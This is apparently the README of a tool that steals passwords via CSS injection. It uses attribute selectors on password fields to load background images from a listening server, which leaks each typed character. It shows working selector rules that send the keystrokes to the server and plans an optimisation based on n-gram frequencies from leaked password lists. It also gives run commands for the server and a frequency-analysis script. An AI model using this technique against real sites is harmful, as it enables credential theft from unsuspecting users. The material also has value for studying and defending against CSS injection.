# Idea
By utilizing the possibilities of CSS selectors such as `input[type='password'][value$='xyz']` we can check if a password field ends with a given string. This can be used to exfiltrate the password character by character.

This idea is not new. There are already multiple implementations of this idea.
I added some improvements to the idea. See section "How it works" for more information.

# How it works

By adding multiple selectors and loading a background image from a server, we can exfiltrate the password character by character.
```
input[type="password"][value$="a"] {
    background-image: url("http://127.0.0.1:8000/?k=a");
}
input[type="password"][value$="b"] {
    background-image: url("http://127.0.0.1:8000/?k=b");
}
```

This approach has a big disadvantage. The same URL will only be requested once. This means that `hello` will by exfiltrated as `helo`.
To fix this we can generate all 2-character permutations. Let's say we have $94$ printable charaters. This will generate $94^2=8836$ selectors (which is acceptable). But this will also limit repeating patterns. Additionaly most of those permutations are rather useless. Statistically quite nobody uses `f:` inside their password. If we would extend this to 3 characters, we would have $94^3=830584$ selectors. This would be overkill.

We can easily make use of 5.000 selectors and more. To use wasted selectors, we can extract the most common 1, 2 and 3 character combinations from english passwords (like rockyou.txt).
| Combination | Count |
|-------------|-------|
| 1-char      | all   |
| 2-char      | 50 % (of the most common) |
| 3-char      | 25 % (of the most common) |
| n-char      | $100/n$ % (of the most common) |

# Usage

See the help message for usage information.
```bash
python3 server.py -h
```

The server needs a frequency histogram of the characters. You can generate one by using the `frequency_analyzer.py` script.
```bash
python3 frequency_analyzer.py -h
```

# Limitations
* Won't detect character deletion
* It can only detect character combinations once. Repeating patterns won't get exfiltrated.
* Only works if a reactive framework is used. (e.g. Angular or React) Else the password field won't be updated and the selectors won't be triggered.
* ... more to come
